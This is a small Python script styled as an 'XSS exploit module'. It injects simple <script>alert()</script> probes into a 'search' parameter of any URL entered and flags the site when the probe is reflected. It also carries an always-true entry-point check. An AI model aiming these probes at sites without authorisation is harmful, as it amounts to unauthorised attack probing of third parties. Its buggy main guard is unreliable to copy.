import requests
from colorama import Fore, Style
import random
import string

def generate_xss_payloads():
    payloads = []
    chars = string.ascii_letters + string.digits + string.punctuation
    for _ in range(20):
        payload = f"<script>alert('{random.choice(chars)}');</script>"
        payloads.append(payload)
    return payloads

def test_xss_vulnerability(url, payloads):
    print(f"{Fore.GREEN}Testing for XSS vulnerabilities on {url}{Style.RESET_ALL}")
    vulnerable = False
    
    for payload in payloads:
        try:
            # Test each XSS payload by injecting it into a URL
            response = requests.get(url, params={'search': payload})
            if payload in response.text:
                print(f"{Fore.YELLOW}XSS Vulnerability detected with payload: {payload}{Style.RESET_ALL}")
                vulnerable = True
        except Exception as e:
            print(f"{Fore.RED}Error testing {url}: {e}{Style.RESET_ALL}")
    
    if not vulnerable:
        print(f"{Fore.CYAN}No XSS vulnerabilities detected on {url}{Style.RESET_ALL}")

def xss_exploit():
    print(f"{Fore.GREEN}XSS Exploit Module Started!{Style.RESET_ALL}")
    print("[*] start with int4 pro_module(XSSExploit) > exploit site_name")
    while True:
        module = input(f"{Fore.RED + Style.BRIGHT}int4{Style.RESET_ALL} PRO({Fore.RED}XSSExploit{Style.RESET_ALL}) > ")

        if module.lower() == "exit":
            print(f"{Fore.YELLOW}Exiting the module...{Style.RESET_ALL}")
            break
        
        elif module.startswith("exploit "):
            try:
                _, target_url = module.split(" ")
                print(f"{Fore.YELLOW}Exploring XSS vulnerabilities on {target_url}{Style.RESET_ALL}")
                
                # Generate payloads
                payloads = generate_xss_payloads()
                
                # Test XSS vulnerability on the target URL
                test_xss_vulnerability(target_url, payloads)
                
            except ValueError:
                print(f"{Fore.RED}Invalid input! Correct usage: exploit <URL>{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}Invalid command: {module}{Style.RESET_ALL}")
if __name__ == "__main__" or "main":
	xss_exploit()